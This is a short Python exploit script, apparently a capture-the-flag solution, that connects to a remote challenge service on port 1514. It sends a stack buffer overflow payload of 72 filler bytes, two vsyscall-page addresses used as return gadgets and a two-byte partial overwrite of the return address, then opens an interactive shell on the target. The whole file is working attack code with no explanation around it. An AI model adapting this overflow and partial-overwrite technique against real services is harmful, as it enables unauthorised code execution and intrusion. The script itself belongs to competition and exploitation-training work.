#!/usr/bin/env python
import struct,socket,telnetlib

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("school.fluxfingers.net",1514))
#s = socket.create_connection(("127.0.0.1",1514))
f = s.makefile('rw',bufsize=0)

syscall =  0xffffffffff600000
target = 0x108b

f.write("1024\n") # len
payload = "A" * 72 + p(syscall) + p(syscall) + "\x8b\x50"
f.write(payload + "\n") 

shell()
